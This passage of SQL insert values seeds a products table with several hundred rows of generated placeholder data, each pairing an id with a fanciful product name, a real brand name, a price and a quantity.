(6216,'Electronic Cotton Car','Logitech','819718.00',173),
(7218,'Oriental Fresh Chips','Nvidia','250815.00',695),
(2998,'Intelligent Concrete Pizza','HTC','576204.00',775),
(9219,'Sleek Cotton Computer','Ferarri','336203.00',656),
(6540,'Rustic Bronze Sausages','Nintendo','175161.00',999),
(2056,'Electronic Metal Mouse','Suzuki','867121.00',577),
(2514,'Rustic Steel Ball','Ferarri','711994.00',997),
(6309,'Recycled Steel Bike','HTC','385268.00',886),
(8306,'Intelligent Concrete Mouse','Polytron','122004.00',683),
(6451,'Elegant Cotton Ball','3M','391574.00',252),
(2783,'Electronic Cotton Shoes','Aisan','133050.00',474),
(3278,'Awesome Rubber Pizza','Mitsubishi','783267.00',809),
(8732,'Awesome Bronze Cheese','Mitsubishi','786897.00',344),
(9963,'Gorgeous Steel Car','Yamaha','683936.00',477),
(8163,'Generic Plastic Ball','Robot','146468.00',682),
(5044,'Gorgeous Steel Hat','Nvidia','308802.00',359),
(8907,'Bespoke Plastic Fish','Robot','128914.00',114),
(1130,'Luxurious Wooden Car','Mercedes','953696.00',217),
(1620,'Unbranded Bronze Fish','Nintendo','995091.00',617),
(2545,'Rustic Metal Fish','Uber','772986.00',361),
(1732,'Sleek Granite Bike','Pepsodent','374299.00',526),
(4673,'Handmade Cotton Computer','Samsung','710535.00',241),
(8960,'Intelligent Soft Car','Nokia','452353.00',348),
(7399,'Generic Soft Car','Motorola','973753.00',299),
(1080,'Practical Plastic Chicken','Amazon','281547.00',308),
(9294,'Generic Wooden Hat','Audi','53848.00',445),
(6810,'Intelligent Metal Ball','Asus','669506.00',515),
(9741,'Electronic Metal Keyboard','Intel','704919.00',841),
(3680,'Gorgeous Bronze Car','Nokia','519876.00',476),
(8696,'Incredible Plastic Towels','Microsoft','74276.00',236),
(6678,'Electronic Cotton Pizza','Aisan','742451.00',434),
(3491,'Refined Steel Car','Ferarri','950124.00',781),
(8487,'Small Concrete Salad','Crocs','620863.00',889),
(2700,'Luxurious Plastic Table','Uniqlo','846302.00',130),
(3921,'Awesome Bronze Keyboard','Amazon','569247.00',855),
(2628,'Oriental Cotton Sausages','Sony','222680.00',373),
(4919,'Fantastic Wooden Fish','Nvidia','826842.00',731),
(2030,'Modern Plastic Bacon','Asus','532256.00',203),
(3064,'Electronic Metal Chips','Uber','614219.00',991),
(6526,'Tasty Steel Hat','Audi','499780.00',327),
(7121,'Incredible Plastic Table','HBO','832908.00',225),
(3059,'Sleek Metal Computer','Lamborghini','663049.00',469),
(6194,'Gorgeous Metal Sausages','Intel','748894.00',541),
(4275,'Generic Wooden Tuna','Adobe','813562.00',933),
(8098,'Handmade Metal Soap','Gucci','445556.00',611),
(4678,'Awesome Bronze Mouse','Porsche','768451.00',838),
(8264,'Modern Soft Shoes','Tesla','929102.00',379),
(2923,'Elegant Plastic Hat','Motorola','42855.00',725),
(3766,'Awesome Rubber Sausages','Hyundai','659615.00',416),
(8405,'Sleek Bronze Bacon','Ferarri','398220.00',357),
(9467,'Handmade Fresh Car','Rolex','601867.00',252),
(2869,'Awesome Soft Bike','Philips','737671.00',849),
(7632,'Incredible Soft Bike','Robot','832945.00',355),
(2533,'Licensed Fresh Table','Amazon','619413.00',828),
(6574,'Unbranded Bronze Table','3M','625589.00',188),
(8339,'Electronic Steel Pants','Uber','227558.00',815),
(6945,'Bespoke Metal Fish','Rolex','872475.00',482),
(3734,'Modern Steel Ball','Adidas','318418.00',949),
(4038,'Electronic Wooden Pizza','Motorola','985818.00',492),
(1078,'Ergonomic Rubber Pants','Intel','613937.00',351),
(6791,'Refined Soft Car','3M','154418.00',230),
(9558,'Handcrafted Granite Gloves','Xiaomi','711224.00',329),
(2265,'Gorgeous Frozen Bike','AMD','598146.00',143),
(9928,'Luxurious Frozen Ball','AMD','519970.00',235),
(8891,'Generic Plastic Pizza','Huawei','896348.00',774),
(9456,'Handmade Granite Tuna','Mercedes','649732.00',714),
(7468,'Sleek Bronze Shirt','Crocs','288530.00',423),
(9626,'Gorgeous Frozen Chair','Lamborghini','472877.00',374),
(5942,'Unbranded Frozen Chicken','Intel','804541.00',665),
(3213,'Electronic Metal Gloves','Adobe','555689.00',788),
(8611,'Modern Cotton Sausages','Philips','291024.00',406),
(8025,'Sleek Wooden Soap','Philips','717730.00',227),
(9195,'Fantastic Steel Fish','Porsche','969982.00',566),
(6584,'Handcrafted Metal Mouse','Motorola','929280.00',835),
(1675,'Incredible Bronze Chair','Disney','52496.00',912),
(4589,'Luxurious Steel Towels','Uber','635952.00',311),
(1691,'Sleek Cotton Chicken','Polytron','208071.00',981),
(2296,'Handcrafted Rubber Shoes','Yamaha','92609.00',318),
(6384,'Incredible Frozen Chicken','Apple','422835.00',818),
(7889,'Licensed Plastic Bacon','Unilever','91025.00',453),
(9506,'Electronic Soft Fish','HTC','580788.00',811),
(3203,'Oriental Rubber Mouse','Amazon','623348.00',176),
(7753,'Tasty Steel Car','Unilever','430741.00',549),
(3263,'Intelligent Rubber Ball','Mercedes','959687.00',686),
(5730,'Incredible Bronze Tuna','Toyota','785487.00',954),
(8863,'Recycled Rubber Shirt','Asus','928720.00',817),
(4774,'Awesome Soft Tuna','Crocs','161022.00',770),
(4190,'Recycled Concrete Fish','Chanel','484835.00',771),
(8094,'Electronic Cotton Mouse','Philips','265777.00',199),
(1584,'Modern Frozen Salad','Nintendo','125417.00',325),
(3600,'Unbranded Soft Gloves','Toshiba','720501.00',400),
(5970,'Practical Bronze Ball','Toshiba','556925.00',391),
(7100,'Oriental Plastic Hat','Mercedes','495560.00',377),
(8827,'Ergonomic Metal Keyboard','Rolex','602449.00',283),
(5448,'Handcrafted Concrete Towels','AMD','862765.00',567),
(6849,'Luxurious Plastic Sausages','Logitech','943259.00',665),
(2511,'Bespoke Fresh Gloves','Toyota','929788.00',870),
(7371,'Intelligent Wooden Chips','Adobe','458582.00',370),
(5824,'Modern Cotton Computer','Chanel','731544.00',580),
(1178,'Handmade Cotton Table','Sharp','780695.00',424),
(5683,'Recycled Cotton Salad','Pepsodent','816704.00',315),
(7420,'Gorgeous Concrete Car','Adobe','720847.00',552),
(1973,'Incredible Cotton Pizza','Audi','314382.00',613),
(9107,'Fantastic Fresh Chicken','Alienware','993260.00',220),
(9427,'Intelligent Rubber Car','Rolex','484752.00',706),
(2323,'Awesome Frozen Bacon','Hyundai','148438.00',955),
(8704,'Electronic Bronze Chair','HTC','474915.00',215),
(7541,'Licensed Rubber Gloves','Porsche','887170.00',754),
(2542,'Gorgeous Metal Soap','Kawasaki','277383.00',815),
(8100,'Gorgeous Plastic Bacon','Sharp','725884.00',247),
(9659,'Elegant Metal Bacon','Yamaha','939260.00',985),
(1029,'Luxurious Bronze Chips','Xiaomi','856865.00',129),
(7447,'Small Bronze Shoes','Yamaha','35905.00',963),
(1698,'Awesome Metal Shirt','Philips','329927.00',725),
(8765,'Oriental Fresh Chicken','Porsche','933964.00',267),
(6858,'Awesome Cotton Bike','Adobe','460061.00',555),
(6814,'Handcrafted Rubber Car','HTC','562664.00',839),
(2665,'Unbranded Granite Table','Rolex','297698.00',274),
(6824,'Handmade Plastic Shoes','Unilever','796756.00',198),
(9914,'Rustic Wooden Gloves','Huawei','123109.00',403),
(4781,'Bespoke Frozen Towels','Toyota','187172.00',929),
(6146,'Handmade Cotton Gloves','Suzuki','890339.00',140),
(3042,'Rustic Cotton Cheese','Mercedes','652246.00',398),
(2445,'Fantastic Cotton Hat','Mitsubishi','591722.00',847),
(4238,'Incredible Metal Chicken','Alienware','730573.00',683),
(9474,'Sleek Bronze Car','3M','233538.00',435),
(9398,'Incredible Concrete Mouse','Uber','365793.00',538),
(3974,'Tasty Rubber Shoes','Motorola','891530.00',108),
(5614,'Rustic Frozen Bike','FedEx','519630.00',517),
(6281,'Tasty Concrete Towels','Pepsodent','90893.00',469),
(9323,'Intelligent Metal Hat','Apple','772854.00',177),
(8531,'Recycled Plastic Sausages','Nintendo','631122.00',215),
(1583,'Bespoke Soft Ball','Acer','67759.00',928),
(4579,'Handcrafted Wooden Salad','Tesla','931549.00',855),
(2979,'Gorgeous Frozen Car','Pepsodent','317047.00',674),
(5394,'Bespoke Concrete Car','Huawei','936277.00',872),
(3292,'Incredible Plastic Bacon','Huawei','892031.00',663),
(5137,'Fantastic Granite Cheese','Nvidia','690179.00',573),
(6398,'Unbranded Frozen Gloves','Chanel','224772.00',775),
(7417,'Fantastic Metal Ball','Adobe','508504.00',987),
(6576,'Sleek Metal Shirt','Intel','71749.00',522),
(9516,'Fantastic Concrete Chicken','Nokia','89718.00',754),
(9265,'Refined Frozen Tuna','Sharp','183565.00',782),
(7432,'Handmade Concrete Pants','Robot','217804.00',859),
(7668,'Electronic Concrete Fish','Rolex','686929.00',651),
(9246,'Rustic Fresh Bacon','Toshiba','492083.00',960),
(7519,'Intelligent Plastic Mouse','Suzuki','601394.00',871),
(6363,'Handmade Steel Chicken','Suzuki','834012.00',167),
(9939,'Licensed Concrete Chair','Kawasaki','29027.00',153),
(7618,'Fantastic Fresh Ball','Uber','694570.00',677),
(3017,'Recycled Fresh Mouse','Aisan','297318.00',575),
(7769,'Licensed Wooden Pants','Xiaomi','963206.00',199),
(8690,'Handmade Bronze Cheese','Alienware','143019.00',185),
(4678,'Small Rubber Pizza','Audi','798504.00',162),
(9374,'Practical Fresh Gloves','Pepsodent','18831.00',245),
(1845,'Modern Bronze Cheese','Polytron','788172.00',244),
(3623,'Unbranded Granite Table','Polytron','69812.00',912),
(3487,'Awesome Frozen Sausages','Aisan','217617.00',205),
(2401,'Luxurious Plastic Bike','Ferarri','62000.00',642),
(6501,'Licensed Steel Shoes','Audi','843721.00',707),
(8525,'Refined Rubber Shirt','Chanel','31744.00',367),
(7020,'Awesome Concrete Hat','IBM','799581.00',890),
(9810,'Handcrafted Wooden Chair','Nintendo','448402.00',983),
(3325,'Licensed Bronze Keyboard','Suzuki','373802.00',952),
(9548,'Refined Wooden Computer','Ferarri','322037.00',463),
(5686,'Sleek Plastic Cheese','Hyundai','335009.00',637),
(3287,'Ergonomic Concrete Towels','Yamaha','892468.00',488),
(5678,'Incredible Rubber Car','Microsoft','772623.00',844),
(6650,'Gorgeous Wooden Gloves','Chanel','773380.00',769),
(2495,'Rustic Cotton Chair','Xiaomi','757373.00',729),
(1438,'Awesome Wooden Towels','IBM','509434.00',870),
(1014,'Generic Wooden Mouse','Amazon','461745.00',754),
(7095,'Elegant Soft Pizza','Acer','584085.00',835),
(6151,'Intelligent Wooden Pizza','Samsung','837655.00',924),
(5405,'Practical Steel Shirt','Asus','577211.00',183),
(2791,'Refined Rubber Keyboard','Hyundai','793730.00',388),
(8749,'Recycled Granite Fish','Motorola','382882.00',635),
(9618,'Licensed Bronze Tuna','Porsche','746862.00',756),
(3872,'Ergonomic Frozen Chips','Sony','891157.00',974),
(7206,'Practical Rubber Ball','Logitech','962877.00',427),
(7052,'Modern Steel Chips','Acer','287397.00',235),
(5954,'Ergonomic Rubber Chips','Uniqlo','958423.00',382),
(9741,'Recycled Frozen Gloves','Vans','134734.00',377),
(8097,'Sleek Metal Car','Mercedes','331453.00',604),
(7794,'Fantastic Concrete Shirt','AMD','812652.00',805),
(7413,'Sleek Frozen Chips','Microsoft','927778.00',801),
(8737,'Fantastic Rubber Hat','Hyundai','685415.00',514),
(9679,'Small Rubber Pizza','Kawasaki','278944.00',579),
(4237,'Incredible Concrete Ball','Lamborghini','952102.00',466),
(7767,'Bespoke Soft Towels','Huawei','458385.00',192),
(4207,'Rustic Frozen Keyboard','IBM','631456.00',299),
(3878,'Rustic Wooden Shirt','Toshiba','500077.00',983),
(1568,'Intelligent Rubber Mouse','Uniqlo','29739.00',406),
(6776,'Generic Concrete Bacon','IBM','881867.00',655),
(7484,'Electronic Granite Fish','IBM','583928.00',962),
(5095,'Luxurious Metal Hat','Disney','394993.00',631),
(4567,'Fantastic Concrete Cheese','FedEx','761846.00',390),
(8780,'Rustic Soft Computer','Nokia','825940.00',815),
(1746,'Small Concrete Car','Nvidia','518108.00',326),
(8217,'Tasty Granite Pants','Motorola','993459.00',738),
(9204,'Tasty Metal Shirt','Suzuki','728534.00',132),
(7116,'Rustic Plastic Bacon','AMD','47964.00',850),
(2619,'Handmade Concrete Gloves','Porsche','987008.00',739),
(1391,'Elegant Concrete Table','3M','973215.00',399),
(5719,'Incredible Frozen Tuna','Toshiba','407216.00',509),
(4967,'Gorgeous Metal Computer','Amazon','439802.00',919),
(6108,'Awesome Rubber Pants','HBO','504015.00',131),
(5374,'Modern Metal Pants','Polytron','311570.00',477),
(6944,'Oriental Cotton Sausages','HBO','355807.00',158),
(7233,'Refined Wooden Computer','Tesla','228332.00',560),
(3983,'Electronic Rubber Fish','HTC','333094.00',395),
(3691,'Recycled Concrete Gloves','Motorola','400520.00',800),
(1081,'Gorgeous Rubber Car','FedEx','36874.00',258),
(8171,'Bespoke Bronze Chair','Yamaha','681334.00',723),
(3428,'Practical Metal Chair','HBO','901122.00',271),
(9248,'Rustic Fresh Chips','Lamborghini','456213.00',714),
(4213,'Rustic Soft Mouse','Toyota','729777.00',607),
(2913,'Handmade Plastic Chips','Mitsubishi','225475.00',948),
(5026,'Intelligent Bronze Cheese','Uniqlo','600706.00',861),
(4518,'Refined Fresh Tuna','Unilever','53020.00',628),
(9693,'Recycled Cotton Bike','Nvidia','236217.00',945),
(3545,'Unbranded Cotton Bacon','3M','556093.00',754),
(5463,'Refined Soft Chicken','3M','161902.00',120),
(8368,'Luxurious Fresh Soap','Audi','255632.00',453),
(1232,'Awesome Soft Sausages','Chanel','327934.00',192),
(6720,'Handcrafted Cotton Hat','Adidas','929441.00',423),
(1644,'Fantastic Fresh Shirt','Porsche','395699.00',566),
(5803,'Tasty Bronze Computer','Microsoft','258864.00',556),
(6269,'Practical Plastic Fish','Adobe','186438.00',724),
(9646,'Sleek Concrete Keyboard','Aisan','210756.00',361),
(5232,'Intelligent Cotton Salad','Kawasaki','362162.00',482),
(1679,'Sleek Rubber Computer','Mercedes','429336.00',669),
(8715,'Unbranded Rubber Towels','HTC','648189.00',595),
(8448,'Practical Bronze Shirt','3M','228837.00',553),
(9036,'Modern Bronze Bike','Polytron','300217.00',875),
(1405,'Modern Steel Hat','Microsoft','972098.00',765),
(8807,'Incredible Frozen Ball','Sharp','802422.00',915),
(8104,'Electronic Concrete Sausages','Porsche','549681.00',194),
(3049,'Unbranded Metal Chicken','Adidas','979417.00',661),
(5634,'Oriental Fresh Fish','Audi','99525.00',890),
(8330,'Licensed Granite Ball','Mercedes','807908.00',433),
(5542,'Sleek Wooden Chair','Vans','756593.00',157),
(9578,'Recycled Plastic Sausages','Yamaha','717192.00',759),
(5766,'Licensed Rubber Sausages','Polytron','761425.00',470),
(5134,'Awesome Plastic Table','Lamborghini','159788.00',739),
(8527,'Ergonomic Fresh Salad','Crocs','602232.00',289),
(8076,'Handcrafted Concrete Shoes','Gucci','25320.00',673),
(7780,'Rustic Wooden Shirt','Asus','18991.00',905),
(1178,'Recycled Granite Salad','Nokia','177526.00',464),
(6665,'Tasty Plastic Shoes','Nvidia','597165.00',766),
(9781,'Recycled Granite Car','Uber','476538.00',451),
(3626,'Tasty Granite Computer','Kawasaki','153285.00',907),
(7732,'Awesome Wooden Pizza','Uber','277286.00',349),
(5732,'Modern Concrete Keyboard','Nvidia','728249.00',261),
(2960,'Small Concrete Shirt','Xiaomi','346767.00',193),
(1477,'Practical Bronze Sausages','Crocs','594253.00',463),
(5155,'Tasty Metal Chair','FedEx','433946.00',328),
(6736,'Incredible Concrete Shirt','Adidas','353307.00',983),
(2352,'Fantastic Concrete Towels','Porsche','821498.00',491),
(6480,'Electronic Soft Car','Audi','52752.00',797),
(3684,'Small Metal Tuna','Nokia','274199.00',991),
(4806,'Fantastic Rubber Keyboard','Ferarri','925879.00',460),
(8934,'Tasty Plastic Chips','Porsche','148612.00',443),
(6555,'Generic Soft Pizza','Apple','589358.00',932),
(1550,'Small Fresh Hat','Porsche','282510.00',956),
(6734,'Generic Soft Chair','Crocs','210207.00',779),
(8922,'Unbranded Fresh Car','Sharp','876860.00',962),
(5405,'Awesome Rubber Salad','Huawei','99437.00',330),
(4788,'Bespoke Metal Chicken','Samsung','780691.00',312),
(3187,'Incredible Metal Chair','Philips','665177.00',633),
(9930,'Small Cotton Table','Gucci','317406.00',420),
(4121,'Small Metal Salad','Mercedes','81389.00',540),
(8940,'Rustic Cotton Bacon','Adidas','38638.00',153),
(2117,'Luxurious Frozen Bike','Audi','733831.00',309),
(3142,'Rustic Granite Bacon','Intel','173845.00',350),
(8013,'Rustic Granite Shirt','Apple','676534.00',461),
(7720,'Bespoke Frozen Chair','Pepsodent','773665.00',316),
(2354,'Rustic Granite Sausages','Tesla','877015.00',235),
(6546,'Practical Cotton Hat','HTC','656655.00',279),
(6607,'Rustic Rubber Chicken','3M','95406.00',647),
(8683,'Ergonomic Rubber Shirt','Hyundai','242862.00',790),
(9153,'Intelligent Fresh Gloves','Mercedes','393034.00',433),
(3081,'Bespoke Concrete Pants','AMD','369624.00',528),
(6579,'Incredible Metal Chips','Uber','680845.00',951),
(8861,'Incredible Concrete Shirt','Amazon','365016.00',386),
(5772,'Rustic Plastic Sausages','Acer','675949.00',106),
(8719,'Luxurious Metal Bike','AMD','664614.00',762),
(9834,'Rustic Plastic Gloves','Unilever','375728.00',401),
(6610,'Recycled Metal Chicken','FedEx','928185.00',483),
(6396,'Elegant Wooden Fish','Huawei','498311.00',810),
(4880,'Oriental Concrete Fish','ZTE','862026.00',698),
(6212,'Awesome Fresh Pants','HTC','867519.00',274),
(2500,'Rustic Cotton Bike','Kawasaki','778058.00',899),
(4034,'Licensed Fresh Ball','Nintendo','117232.00',236),
(4181,'Electronic Rubber Pants','Samsung','745074.00',822),
(7508,'Rustic Soft Shoes','ZTE','926969.00',718),
(7087,'Electronic Concrete Salad','Yamaha','523824.00',459),
(9177,'Tasty Rubber Soap','Apple','693039.00',511),
(2089,'Unbranded Wooden Pizza','Pepsodent','73832.00',374),
(9627,'Bespoke Granite Pants','Toyota','674946.00',838),
(6247,'Electronic Fresh Ball','Huawei','321496.00',138),
(8403,'Sleek Rubber Chicken','Xiaomi','38804.00',550),
(2686,'Luxurious Wooden Towels','Suzuki','300617.00',418),
(8102,'Incredible Concrete Pizza','HBO','433582.00',633),
(1144,'Bespoke Steel Fish','Nintendo','824945.00',758),
(1266,'Small Cotton Pizza','Uber','907144.00',203),
(2812,'Bespoke Granite Table','Kawasaki','646634.00',134),
(8367,'Electronic Frozen Bike','Kawasaki','99444.00',468),
(6644,'Tasty Steel Pizza','Mitsubishi','453703.00',449),
(9591,'Elegant Concrete Hat','Aisan','722970.00',263),
(9290,'Recycled Granite Pants','Ferarri','554995.00',359),
(9456,'Incredible Soft Pizza','FedEx','890645.00',945),
(8217,'Incredible Metal Soap','Gucci','158333.00',335),
(1868,'Handcrafted Fresh Bacon','ZTE','635813.00',635),
(3669,'Elegant Cotton Hat','Yamaha','274138.00',334),
(1716,'Ergonomic Fresh Bacon','Crocs','92152.00',355),
(7568,'Unbranded Rubber Fish','Sony','51198.00',307),
(8565,'Oriental Granite Car','Nintendo','367394.00',568),
(4636,'Recycled Frozen Computer','FedEx','757977.00',154),
(1204,'Luxurious Metal Shirt','Kawasaki','141850.00',802),
(9894,'Oriental Plastic Salad','Vans','788933.00',929),
(3185,'Luxurious Soft Hat','Nike','637313.00',725),
(9777,'Tasty Plastic Hat','Hyundai','352661.00',382),
(4255,'Refined Steel Chips','HBO','215832.00',764),
(6873,'Sleek Concrete Hat','Alienware','296816.00',581),
(9987,'Generic Wooden Ball','Adobe','89449.00',723),
(3344,'Intelligent Soft Hat','Apple','984450.00',972),
(2889,'Generic Soft Towels','Vans','317479.00',733),
(4768,'Ergonomic Bronze Hat','Nintendo','74228.00',596),
(6516,'Sleek Fresh Shirt','Philips','485677.00',457),
(5568,'Electronic Soft Towels','Samsung','960553.00',983),
(6465,'Refined Cotton Car','Samsung','871140.00',576),
(5081,'Elegant Fresh Pants','IBM','195268.00',726),
(4664,'Rustic Granite Computer','Nokia','716471.00',519),
(9611,'Handmade Rubber Tuna','Acer','654646.00',762),
(7485,'Modern Bronze Towels','Lenovo','161160.00',186),
(7996,'Bespoke Soft Soap','Philips','155357.00',607),
(2920,'Recycled Bronze Tuna','Vans','619927.00',795),
(4335,'Rustic Steel Gloves','Nokia','273901.00',844),
(3242,'Modern Granite Pizza','Nike','284404.00',326),
(6513,'Luxurious Cotton Car','Pepsodent','578228.00',885),
(8365,'Unbranded Rubber Fish','Tesla','516530.00',967),
(6713,'Electronic Steel Sausages','Toshiba','903872.00',903),
(6344,'Unbranded Plastic Shoes','Uber','769924.00',393),
(2544,'Bespoke Frozen Towels','Mitsubishi','717436.00',367),
(3141,'Ergonomic Steel Shirt','Mercedes','325923.00',748),
(8473,'Awesome Granite Pizza','Acer','158061.00',375),
(4302,'Handmade Steel Table','Intel','914094.00',794),
(1996,'Modern Plastic Chicken','Uber','840054.00',410),
(1450,'Fantastic Metal Cheese','Robot','103558.00',313),
(3611,'Awesome Plastic Ball','Sony','323731.00',482),
(2118,'Luxurious Soft Car','Robot','837647.00',582),
(1347,'Recycled Fresh Tuna','Apple','118125.00',220),
(1959,'Intelligent Soft Tuna','Vans','409482.00',777),
(3221,'Elegant Bronze Bike','HTC','265366.00',972),
(3833,'Oriental Granite Keyboard','Alienware','638293.00',166),
(2915,'Fantastic Soft Shoes','Chanel','816152.00',745),
(1811,'Intelligent Metal Towels','HTC','667902.00',146),
(4232,'Handmade Soft Bike','Toshiba','402570.00',981),
(8597,'Gorgeous Fresh Hat','Aisan','985867.00',621),
(2151,'Handmade Cotton Tuna','Mercedes','808217.00',344),
(1332,'Oriental Concrete Shoes','Mitsubishi','967681.00',437),
(7235,'Ergonomic Plastic Mouse','Hyundai','311377.00',319),
(1019,'Gorgeous Soft Chips','Pepsodent','785087.00',208),
(5813,'Intelligent Cotton Chicken','Vans','399776.00',735),
(5293,'Handcrafted Plastic Towels','FedEx','481640.00',773),
(7572,'Rustic Cotton Bacon','Alienware','358712.00',953),
(8202,'Tasty Steel Shoes','Intel','903746.00',426),
(2921,'Fantastic Frozen Towels','Uniqlo','101042.00',429),
(6162,'Ergonomic Frozen Chips','ZTE','921026.00',151),
(2415,'Handmade Wooden Shirt','Samsung','691005.00',166),
(5282,'Modern Cotton Ball','Nvidia','807400.00',101),
(9241,'Fantastic Bronze Hat','3M','558144.00',159),
(2136,'Awesome Steel Ball','AMD','524930.00',370),
(4462,'Incredible Bronze Fish','Porsche','76642.00',476),
(9195,'Awesome Soft Cheese','Toshiba','14083.00',767),
(4281,'Handcrafted Metal Chair','Polytron','632483.00',749),
(7738,'Bespoke Soft Mouse','Logitech','461765.00',337),
(3302,'Handcrafted Fresh Pizza','Uniqlo','799884.00',652),
(3243,'Licensed Cotton Table','Intel','273188.00',360),
(9659,'Awesome Granite Bacon','ZTE','426248.00',853),
(5646,'Refined Rubber Chicken','Amazon','486342.00',373),
(2239,'Elegant Concrete Computer','Logitech','692881.00',649),
(3216,'Tasty Soft Computer','Kawasaki','994676.00',830),
(8215,'Tasty Fresh Mouse','Unilever','294541.00',851),
(8754,'Intelligent Fresh Computer','Nintendo','872900.00',203),
(8638,'Electronic Fresh Car','AMD','317220.00',763),
(1356,'Sleek Steel Shoes','Asus','63630.00',875),
(3112,'Practical Fresh Car','Suzuki','433382.00',594),
(9592,'Electronic Frozen Gloves','Huawei','493932.00',148),
(4021,'Handmade Concrete Fish','Nokia','847770.00',241),
(3637,'Elegant Fresh Gloves','Hyundai','841601.00',689),
(9644,'Ergonomic Metal Soap','Mitsubishi','828636.00',517),
(9661,'Awesome Steel Keyboard','Logitech','793095.00',407),
(3120,'Practical Steel Bike','Huawei','117221.00',681),
(8175,'Fantastic Wooden Hat','Uniqlo','723744.00',334),
(9151,'Bespoke Bronze Tuna','Gucci','180502.00',407),
(9099,'Licensed Wooden Sausages','Lenovo','783819.00',214),
(3020,'Refined Fresh Bacon','FedEx','810413.00',367),
(6088,'Small Wooden Pants','Alienware','727780.00',931),
(1068,'Recycled Wooden Gloves','Huawei','438104.00',527),
(3315,'Generic Fresh Towels','Suzuki','165097.00',855),
(1216,'Oriental Fresh Car','Nintendo','468957.00',912),
(2104,'Incredible Soft Table','Unilever','351580.00',703),
(9653,'Sleek Rubber Chair','Chanel','955045.00',487),
(5651,'Awesome Steel Gloves','Motorola','188302.00',814),
(3261,'Refined Fresh Shoes','Microsoft','480727.00',905),
(5789,'Recycled Fresh Towels','Rolex','327983.00',953),
(5446,'Sleek Rubber Pants','Sony','367586.00',543),
(3869,'Handmade Wooden Gloves','Vans','107373.00',581),
(6078,'Unbranded Cotton Pizza','Sharp','826801.00',809),
(5508,'Gorgeous Steel Chicken','Samsung','413075.00',759),
(1142,'Intelligent Steel Hat','3M','70048.00',289),
(3631,'Electronic Metal Bacon','Crocs','156419.00',708),
(6752,'Rustic Steel Fish','Nokia','977360.00',112),
(7616,'Electronic Frozen Cheese','Unilever','928827.00',870),
(7652,'Handmade Fresh Shoes','FedEx','550558.00',314),
(9757,'Oriental Bronze Ball','Gucci','260949.00',928),
(5939,'Sleek Soft Hat','Logitech','706867.00',947),
(1853,'Handcrafted Rubber Keyboard','Polytron','777617.00',741),
(1779,'Incredible Wooden Gloves','Robot','746505.00',993),
(7409,'Tasty Bronze Pizza','Uber','90526.00',811),
(7204,'Handcrafted Wooden Bike','Uber','383381.00',572),
(2620,'Incredible Wooden Computer','Yamaha','632708.00',315),
(5605,'Electronic Rubber Salad','Rolex','887230.00',242),
(4695,'Intelligent Rubber Pants','Xiaomi','680526.00',695),
(3157,'Practical Granite Tuna','Uber','924176.00',384),
(3909,'Awesome Soft Chair','Microsoft','944954.00',203),
(6441,'Handmade Frozen Table','Huawei','125217.00',453),
(3611,'Incredible Wooden Towels','Lamborghini','142097.00',791),
(6961,'Electronic Rubber Shoes','Sony','754339.00',395),
(8421,'Luxurious Wooden Computer','Uber','159551.00',109),
(2390,'Modern Steel Pants','Asus','300637.00',123),
(9485,'Bespoke Soft Ball','Gucci','818374.00',890),
(9052,'Handcrafted Wooden Fish','Uber','841353.00',373),
(9514,'Electronic Cotton Hat','Apple','819474.00',295),
(9622,'Intelligent Soft Gloves','HBO','764088.00',591),
(2257,'Elegant Granite Soap','Uniqlo','844573.00',240),
(8351,'Luxurious Rubber Table','3M','500214.00',623),
(3781,'Intelligent Rubber Computer','Disney','706891.00',168),
(5095,'Practical Bronze Chicken','Mercedes','863278.00',927),
(5580,'Sleek Plastic Bacon','Audi','494573.00',826),
(1672,'Oriental Rubber Ball','Philips','176850.00',987),
(8429,'Fantastic Frozen Bacon','ZTE','68785.00',726),
(6565,'Modern Frozen Salad','Sony','823008.00',989),
(6511,'Refined Plastic Ball','Acer','481982.00',625),
(7144,'Practical Concrete Table','Ferarri','379816.00',913),
(5984,'Recycled Plastic Soap','Toshiba','862591.00',841),
(3046,'Recycled Wooden Mouse','Vans','367766.00',854),
(8722,'Small Fresh Gloves','Uber','870254.00',817),
(4161,'Modern Wooden Mouse','Adidas','563477.00',457),
(9465,'Intelligent Concrete Shoes','Lamborghini','358812.00',302),
(7892,'Handcrafted Cotton Chair','Alienware','149172.00',527),
(8590,'Fantastic Bronze Mouse','Disney','760147.00',634),
(1575,'Elegant Fresh Fish','Robot','425754.00',855),
(7405,'Electronic Wooden Bike','Amazon','523290.00',460),
(2860,'Sleek Soft Shirt','Toshiba','929041.00',421),
(6790,'Incredible Cotton Soap','AMD','228949.00',732),
(9098,'Intelligent Cotton Shoes','Chanel','421446.00',676),
(2670,'Sleek Bronze Gloves','Sharp','904045.00',863),
(5367,'Generic Metal Chips','Aisan','989480.00',370),
(6421,'Practical Bronze Pants','Hyundai','761868.00',963),
(2348,'Electronic Concrete Cheese','Unilever','330126.00',970),
(7568,'Tasty Fresh Towels','Logitech','292601.00',662),
(8582,'Handmade Cotton Bike','3M','654035.00',488),
(5641,'Fantastic Metal Bacon','Crocs','448446.00',371),
(4489,'Handcrafted Granite Pants','Acer','843747.00',135),
(4553,'Incredible Metal Cheese','Philips','525894.00',365),
(2487,'Incredible Concrete Car','Amazon','161696.00',256),
(8406,'Awesome Concrete Keyboard','Adidas','377379.00',364),
(7555,'Oriental Concrete Tuna','Unilever','380572.00',844),
(8471,'Oriental Cotton Towels','ZTE','220172.00',544),
(7247,'Incredible Fresh Computer','Intel','996013.00',368),
(7611,'Handcrafted Wooden Bacon','Aisan','275111.00',481),
(8262,'Incredible Rubber Chicken','Ferarri','96619.00',349),
(7502,'Recycled Bronze Cheese','Suzuki','334107.00',574),
(8685,'Fantastic Bronze Chicken','Pepsodent','77003.00',911),
(8514,'Fantastic Plastic Towels','Lenovo','783449.00',152),
(2149,'Fantastic Cotton Fish','Uniqlo','93402.00',622),
(8452,'Handcrafted Frozen Pizza','Polytron','124428.00',678),
(9905,'Awesome Fresh Ball','Kawasaki','691132.00',875),
(4646,'Oriental Plastic Hat','Nvidia','588539.00',840),
(6659,'Small Plastic Tuna','Ferarri','284296.00',649),
(6986,'Rustic Concrete Chips','Disney','277034.00',357),
(4095,'Practical Plastic Chicken','Polytron','122979.00',416),
(2330,'Bespoke Cotton Ball','Sony','863494.00',989),
(9729,'Luxurious Metal Pizza','3M','39277.00',135),
(4218,'Tasty Steel Towels','Toshiba','445259.00',163),
(7092,'Ergonomic Bronze Hat','Lamborghini','279061.00',811),
(4003,'Practical Rubber Computer','ZTE','169502.00',320),
(8826,'Rustic Soft Chips','Gucci','666863.00',193),
(5598,'Refined Granite Soap','Samsung','934972.00',537),
(5642,'Refined Bronze Shoes','Mercedes','644607.00',733),
